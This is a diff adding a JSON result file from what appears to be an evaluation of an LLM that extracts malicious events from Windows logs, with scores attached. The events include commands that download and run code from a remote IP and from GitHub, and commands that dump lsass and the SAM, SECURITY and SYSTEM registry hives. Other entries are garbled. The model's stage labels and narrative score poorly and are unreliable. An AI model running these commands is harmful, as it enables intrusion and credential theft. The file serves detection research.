@@ -1,0 +1,390 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\RES34B4.tmp\" \"c:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\CSCE10EFB0F87374A028BB2C41E7AC324B0.TMP\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"]>",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uttj5ob4.qgk.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ahqkiquo.hnx.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wqyhhpdp.cd5.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_j5rttxkk.xxq.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0f3bdq2r.cxe.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m2z44eio.psf.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "\\[InternetShortcut]\\> %temp%\\\\T1547.009_modified_shortcut.url & echo URL=C:\\windows\\\\system32\\\\calc.exe >> %temp%\\\\T1547.009_modified_shortcut.url & %temp%\\\\T1547.009_modified_shortcut.url",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\windows\\\\system32\\\\calc.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'; Invoke-AtomicTest T1220\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-atomictest t1548.002 -testnumbers 2 ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c T1059.006.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http:\\/\\/124\\.223\\.85\\.207:8082\\/Test\\.hta -Method \\\"POST\\\" -UseBasicParsing -ContentType \\\"application\\/json\\\"\\\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "TaskKill /f /IM WordPad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime='2020-10-10 12:12:12'\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime='2020-10-10 12:12:12'\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\51qsfzqa\\51qsfzqa.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\windows\\system32\\cmd.exe atbroker.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\WINDOWS\\system32\\cmd.exe /c \"start /min sangforcat.exe -v -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Program Files\\Windows Defender Advanced Threat Protection\\virusguard.exe -start -args \"-w -q -s -r -e -f\" -port 1856 -process_guid f1a2b3c4d56789abcdef012345678901234",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\virusguard.exe\" -start -args \"{\\\"clean_up_at_shutdown\\\": true}\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "taskkill.exe /f /im dllhost.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tasklist.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Atom\\Core\\bin\\toolkit\\engine\\compile.cpp -define -Debug mdrain_x86 -Define -mdrain_x64 -define -debug_mode -optimize_for_size",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "16600 google update svc",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "googleupdate.exe /svc",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -encode \"C:\\\\Program Files\\\\Google\\\\Google Update\\\\GoogleUpdate.exe\" \"C:\\\\tmp\\\\encoded.txt\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\msvcr90.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\msvcp100.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\msvcr100.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\python27.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\pywintypes27.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\_MEI73082\\\\sqlite3.dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\\u0161\\mail\\templates\\rating.html",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\\u0161\\mail\\templates\\rating.js",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe', Invoke-AtomicTest T1220",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\administator\\appdata\\local\\temp\\tbvkjpetfjp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\administator\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg.exe save hklm\\sam c:\\users\\administator\\appdata\\local\\temp\\thswwf",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Users\\Administration\\Desktop\\shell\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Users\\Administration\\Desktop\\shell\\procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Collection"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe', Invoke-AtomicTest T1220",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm/security c:\\users\\administrator\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg.exe save hklm/system c:\\users\\administrator\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg.exe save hklm/sam c:\\users\\administrator\\appdata\\local\\temp\\tthwwf",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1; Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082//test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082//test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Users/Administrator/Desktop/shell/procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Users/Administrator/Desktop/shell/procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /c notepad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082//test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082//test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wermgr.exe /purgestores",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wermgr.exe /purgestores",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "power shell -ex bypass -fi Chrome Remote Services.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\windows\\system32\\cmd.exe /C start C:\\windows\\system32\\cmd.exe /C \"timeout /t 3 >nul && echo TestSVC > \\.\\\\\\\\.pipe\\\\\\\\TestSVC\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\\\\\Users\\\\\\\\ADMINI~1\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\__PSScriptPolicyTest_55uevqrj\uc3d1.ps1",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attack starts by attempting initial access via ATBroker.exe, likely as part of the Windows operating system. At this point, there doesn't appear to be much additional information available regarding how the attack began. However, we can see several connections to Google services such as GoogleUpdate.exe and Google Chrome, suggesting some form of lateral movement or reconnaissance within the internal network. Furthermore, Powershell commands indicate collection of system information, credential manipulation, and possible privilege escalation attempts using Mimikatz.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122952,
+      "completion_tokens": 7005,
+      "total_tokens": 129957,
+      "wall_clock_s": 100.19,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.09411764705882353,
+      "recall": 0.3333333333333333,
+      "f1": 0.14678899082568808,
+      "tp": 8,
+      "fp": 77,
+      "fn": 16
+    },
+    "stage": {
+      "precision": 0.011764705882352941,
+      "recall": 0.043478260869565216,
+      "f1": 0.018518518518518517,
+      "tp": 1,
+      "fp": 84,
+      "fn": 22,
+      "recall_partial": 0.17391304347826086
+    },
+    "hallucination_rate": 0.171875,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122952,
+      "completion_tokens": 7005,
+      "total_tokens": 129957,
+      "wall_clock_s": 100.19,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
